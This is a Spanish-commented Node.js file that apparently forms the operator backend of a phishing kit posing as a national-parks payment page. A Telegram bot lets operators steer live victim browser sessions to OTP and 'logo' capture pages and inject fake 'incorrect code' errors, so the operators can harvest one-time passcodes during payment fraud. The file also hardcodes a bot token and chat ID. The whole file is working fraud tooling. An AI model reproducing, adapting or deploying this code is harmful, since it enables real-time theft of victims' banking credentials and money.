// ─────────────────────────────────────────────────────────────────────────────
//  telegram-bot.js  —  Parques Nacionales
//  Polling, teclados inline y dispatcher Socket.IO para el flujo de pagos.
// ─────────────────────────────────────────────────────────────────────────────

const BOT_TOKEN = process.env.TELEGRAM_TOKEN    || '8456124201:AAGXJICrhdzZP3vUFAroVQd_5x6Av90XHIc';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID  || '-1003048014042';

// Map<sessionId, { socketId }>
const activeSessions = new Map();

// Map<sessionId, { url, showError, errorMessage, ts }> — acción pendiente para HTTP polling
const pendingActions = new Map();

let _io = null;
let tgOffset = 0;

// Limpiar pendingActions con más de 5 minutos de antigüedad
setInterval(() => {
    const cutoff = Date.now() - 5 * 60 * 1000;
    for (const [sid, a] of pendingActions) {
        if (a.ts < cutoff) pendingActions.delete(sid);
    }
}, 60 * 1000);

function setIo(io) { _io = io; }

// ── Teclado inline principal ──────────────────────────────────────────────────
function getKeyboard(tid) {
    return [
        [
            { text: '🔐 OTP',        callback_data: `otp|${tid}`        },
            { text: '❌ Error OTP',   callback_data: `error_otp|${tid}`  }
        ],
        [
            { text: '🪪 Pedir Logo', callback_data: `logo|${tid}`       },
            { text: '❌ Error Logo', callback_data: `error_logo|${tid}` }
        ]
    ];
}

// ── Enviar mensaje ────────────────────────────────────────────────────────────
async function sendTelegram(text, keyboard) {
    const payload = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = { inline_keyboard: keyboard };
    try {
        const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(payload)
        });
        const data = await res.json();
        if (!data.ok) console.error('[TG] Error al enviar:', data.description);
        else          console.log('[TG] Mensaje enviado. id:', data.result.message_id);
    } catch (e) {
        console.error('[TG] Excepción:', e.message);
    }
}

// ── Quitar spinner del botón ───────────────────────────────────────────────────
function answerCallback(cbId, text = '') {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ callback_query_id: cbId, text })
    }).catch(() => {});
}

// ── Actualizar botones del mensaje ────────────────────────────────────────────
function editKeyboard(chatId, msgId, keyboard) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({
            chat_id:      chatId,
            message_id:   msgId,
            reply_markup: { inline_keyboard: keyboard }
        })
    }).catch(() => {});
}

// ── Mapa de acciones → comandos para el navegador ─────────────────────────────
const ACTION_MAP = {
    otp:        { url: './otp-check.html' },
    error_otp:  { url: './otp-check.html',  showError: true, errorMessage: '⚠️ Código OTP incorrecto, intenta nuevamente' },
    logo:       { url: './logo-check.html' },
    error_logo: { url: './logo-check.html', showError: true, errorMessage: '⚠️ Código inválido, intenta nuevamente' }
};

// Nombre legible de cada acción para el mensaje de confirmación
const ACTION_LABELS = {
    otp:        '🔐 OTP',
    error_otp:  '❌ Error OTP',
    logo:       '🪪 Pedir Logo',
    error_logo: '❌ Error Logo',
};

// ── Manejar presión de botón ──────────────────────────────────────────────────
async function handleCallback(cb) {
    const raw    = cb.data || '';
    const chatId = cb.message.chat.id;
    const msgId  = cb.message.message_id;
    const [action, tid] = raw.split('|');
    const sess   = activeSessions.get(tid);

    console.log(`[TG] action=${action} tid=${tid} sess=${sess ? 'found socketId=' + sess.socketId : 'MISSING'}`);

    const mapped = ACTION_MAP[action];
    if (!mapped) {
        answerCallback(cb.id, `⚠️ Acción desconocida: ${action}`);
        return;
    }

    // 1. Guardar acción para HTTP polling
    pendingActions.set(tid, {
        url:          mapped.url,
        showError:    mapped.showError    || false,
        errorMessage: mapped.errorMessage || null,
        ts:           Date.now()
    });

    // 2. Enviar por Socket.IO para redirect instantáneo
    if (sess && sess.socketId && _io) {
        const cmd = { action: 'redirect', url: mapped.url };
        if (mapped.showError) { cmd.showError = true; cmd.errorMessage = mapped.errorMessage; }
        _io.to(sess.socketId).emit('command', cmd);
    }

    // 3. Responder callback (quita el spinner del botón en Telegram)
    answerCallback(cb.id, `✅ ${ACTION_LABELS[action] || action}`);

    // 4. Eliminar los botones del mensaje (teclado vacío)
    editKeyboard(chatId, msgId, []);

    // 5. Enviar mensaje de confirmación con operador y botón presionado
    const operator = cb.from.username
        ? '@' + cb.from.username
        : (cb.from.first_name || 'Operador');
    const label = ACTION_LABELS[action] || action;
    await sendTelegram(
        `✅ <b>${label}</b>\n` +
        `👤 Operador: <b>${operator}</b>\n` +
        `🔑 Sesión: <code>${tid}</code>`
    );
}

// ── Polling (long-poll cada 1 s) ──────────────────────────────────────────────
function startPolling() {
    if (!BOT_TOKEN) {
        console.warn('[TG] BOT_TOKEN vacío — polling deshabilitado');
        return;
    }
    const botId = BOT_TOKEN.split(':')[0];
    console.log(`[TG] Usando bot ID: ${botId}`);
    async function poll() {
        const ctrl = new AbortController();
        // 35 s = 25 s Telegram timeout + 10 s buffer; evita que fetch se cuelgue para siempre
        const timer = setTimeout(() => ctrl.abort(), 35000);
        try {
            const res  = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${tgOffset}&timeout=25&allowed_updates=%5B%22callback_query%22%5D`,
                { signal: ctrl.signal }
            );
            clearTimeout(timer);
            const data = await res.json();
            if (!data.ok) {
                console.error(`[TG] getUpdates falló: ${data.error_code} — ${data.description}`);
                setTimeout(poll, 5000);
                return;
            }
            if (data.result.length > 0) {
                for (const upd of data.result) {
                    tgOffset = upd.update_id + 1;
                    if (upd.callback_query) await handleCallback(upd.callback_query);
                }
            }
        } catch (e) {
            clearTimeout(timer);
            if (e.name === 'AbortError') {
                console.warn('[TG] getUpdates timeout — reiniciando poll');
            } else {
                console.error('[TG] Error en poll:', e.message);
            }
        }
        setTimeout(poll, 1000);
    }
    poll();
    console.log('[TG] Polling iniciado');
}

module.exports = { activeSessions, pendingActions, setIo, getKeyboard, sendTelegram, startPolling };
